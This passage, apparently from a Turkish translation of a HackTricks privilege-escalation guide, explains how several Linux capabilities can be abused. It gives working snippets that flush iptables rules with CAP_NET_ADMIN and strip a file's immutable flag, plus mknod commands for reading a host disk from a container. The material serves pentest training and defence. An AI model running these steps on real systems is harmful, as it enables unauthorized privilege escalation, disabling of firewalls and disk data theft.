if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) capability, sahibine açık network namespace'leri içindeki **network yapılandırmalarını değiştirme** yetkisi verir; buna firewall ayarları, routing tabloları, socket izinleri ve network interface ayarları da dahildir. Ayrıca network interface'lerinde **promiscuous mode** etkinleştirilmesini sağlayarak namespace'ler genelinde packet sniffing yapılmasına olanak tanır.

**binary ile örnek**

**python binary**'sinin bu capabilities'lere sahip olduğunu varsayalım.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**Bu, inode özniteliklerinin değiştirilebileceği anlamına gelir.** Bu capability ile doğrudan privilege escalation gerçekleştiremezsiniz.

**Binary ile örnek**

Bir dosyanın immutable olduğunu ve python'ın bu capability'ye sahip olduğunu tespit ederseniz, **immutable özniteliğini kaldırabilir ve dosyayı değiştirilebilir hâle getirebilirsiniz:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
> [!TIP]
> Genellikle bu immutable attribute'un şu komutlar kullanılarak ayarlanıp kaldırıldığını unutmayın:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html), `chroot(2)` system call'unun çalıştırılmasını etkinleştirir; bu da bilinen vulnerabilities üzerinden `chroot(2)` environment'larından escape edilmesine potansiyel olarak olanak tanıyabilir:

- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html), system restart'leri için `reboot(2)` system call'unun çalıştırılmasına olanak tanımakla kalmaz; belirli hardware platformlarına uyarlanmış `LINUX_REBOOT_CMD_RESTART2` gibi specific command'ları da destekler. Ayrıca yeni veya signed crash kernel'larını yüklemek için `kexec_load(2)` ve Linux 3.17'den itibaren `kexec_file_load(2)` kullanımını da etkinleştirir.

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html), Linux 2.6.37'de daha geniş kapsamlı **CAP_SYS_ADMIN** capability'sinden ayrılmış ve özellikle `syslog(2)` call'unun kullanılabilmesini sağlamıştır. Bu capability, `kptr_restrict` setting'i 1 olduğunda `/proc` ve benzer interface'ler üzerinden kernel address'lerinin görüntülenmesini sağlar; bu setting kernel address'lerinin ne ölçüde açığa çıkarılacağını kontrol eder. Linux 2.6.39'dan beri `kptr_restrict` için default değer 0'dır; bu, kernel address'lerinin açığa çıktığı anlamına gelir. Ancak birçok distribution güvenlik nedenleriyle bunu 1 (address'leri yalnızca uid 0 dışındakilerden gizle) veya 2 (address'leri her zaman gizle) olarak ayarlar.

Ek olarak **CAP_SYSLOG**, `dmesg_restrict` 1 olarak ayarlandığında `dmesg` output'una erişim sağlar. Bu değişikliklere rağmen **CAP_SYS_ADMIN**, historical precedents nedeniyle `syslog` operation'larını gerçekleştirme yetkisini korur.

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html), `mknod` system call'unun regular file'lar, FIFO'lar (named pipe'lar) veya UNIX domain socket'ler oluşturmanın ötesindeki functionality'sini genişletir. Özellikle aşağıdakileri içeren special file'ların oluşturulmasına izin verir:

- **S_IFCHR**: Terminal gibi device'lar olan character special file'lar.
- **S_IFBLK**: Disk gibi device'lar olan block special file'lar.

Bu capability, device file'ları oluşturabilmesi gereken process'ler için gereklidir ve character veya block device'lar üzerinden doğrudan hardware interaction'ını mümkün kılar.

Bu, default docker capability'sidir ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Bu capability, aşağıdaki koşullar altında host üzerinde (full disk read yoluyla) privilege escalation yapılmasına olanak tanır:

1. Host'a initial access sahibi olmak (Unprivileged).
2. Container'a initial access sahibi olmak (Privileged (EUID 0) ve effective `CAP_MKNOD`).
3. Host ve container aynı user namespace'i paylaşmalıdır.

**Container İçinde Block Device Oluşturma ve Erişme Adımları:**

1. **Standard User Olarak Host Üzerinde:**

- `id` ile mevcut user ID'nizi belirleyin; örneğin `uid=1000(standarduser)`.
- Target device'ı belirleyin; örneğin `/dev/sdb`.

2. **`root` Olarak Container İçinde:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Host'a Geri Dönün:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
Bu yaklaşım, standart kullanıcının container üzerinden `/dev/sdb` cihazındaki verilere erişmesine ve potansiyel olarak bu verileri okumasına olanak tanır; bunu paylaşılan user namespace'lerden ve cihaz üzerinde ayarlanan izinlerden yararlanarak gerçekleştirir.

### CAP_SETPCAP

**CAP_SETPCAP**, bir process'in başka bir process'in **capability set'lerini değiştirmesini** sağlar ve effective, inheritable ve permitted set'lerine capability eklenmesine veya bu set'lerden capability kaldırılmasına olanak tanır. Ancak bir process yalnızca kendi permitted set'inde sahip olduğu capability'leri değiştirebilir; bu da başka bir process'in ayrıcalıklarını kendi ayrıcalıklarının ötesine yükseltememesini sağlar. Güncel kernel güncellemeleri bu kuralları sıkılaştırmış ve `CAP_SETPCAP` kullanımını yalnızca kendi veya alt process'lerinin permitted set'lerindeki capability'leri azaltmakla sınırlandırmıştır; bunun amacı güvenlik risklerini azaltmaktır. Kullanım için effective set'te `CAP_SETPCAP` ve permitted set'te hedef capability'lerin bulunması gerekir; değişiklikler için `capset()` kullanılır. Bu, `CAP_SETPCAP`'in temel işlevini ve sınırlamalarını özetleyerek privilege management ve security enhancement alanlarındaki rolünü vurgular.

**`CAP_SETPCAP`**, bir process'in **başka bir process'in capability set'lerini değiştirmesine** olanak tanıyan bir Linux capability'sidir. Başka process'lerin effective, inheritable ve permitted capability set'lerine capability ekleme veya bu set'lerden capability kaldırma yetkisi verir. Ancak bu capability'nin nasıl kullanılabileceği konusunda bazı kısıtlamalar vardır.

`CAP_SETPCAP` sahibi bir process, **yalnızca kendi permitted capability set'inde bulunan capability'leri verebilir veya kaldırabilir**. Başka bir deyişle, bir process kendisinde bulunmayan bir capability'yi başka bir process'e veremez. Bu kısıtlama, bir process'in başka bir process'in ayrıcalıklarını kendi ayrıcalık seviyesinin ötesine yükseltmesini engeller.

Ayrıca, güncel kernel sürümlerinde `CAP_SETPCAP` capability'si **daha da kısıtlanmıştır**. Artık bir process'in diğer process'lerin capability set'lerini rastgele değiştirmesine izin vermez. Bunun yerine, **yalnızca kendi permitted capability set'indeki veya alt process'lerinin permitted capability set'indeki capability'leri azaltmasına** izin verir. Bu değişiklik, capability ile ilişkili olası güvenlik risklerini azaltmak amacıyla getirilmiştir.

`CAP_SETPCAP`'i etkili şekilde kullanmak için capability'nin effective capability set'inizde, hedef capability'lerin ise permitted capability set'inizde bulunması gerekir. Ardından diğer process'lerin capability set'lerini değiştirmek için `capset()` system call'unu kullanabilirsiniz.

Özetle, `CAP_SETPCAP` bir process'in diğer process'lerin capability set'lerini değiştirmesine izin verir, ancak kendisinde bulunmayan capability'leri veremez. Ayrıca, güvenlik endişeleri nedeniyle güncel kernel sürümlerinde işlevselliği yalnızca kendi permitted capability set'indeki veya alt process'lerinin permitted capability set'lerindeki capability'leri azaltmaya izin verecek şekilde sınırlandırılmıştır.

## Referanslar

**Bu örneklerin çoğu** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com) adresindeki bazı lab'lardan alınmıştır; bu privesc tekniklerini uygulamak istiyorsanız bu lab'ları öneririm.

**Diğer referanslar**:

- [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
- [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​
{{#include ../../banners/hacktricks-training.md}}
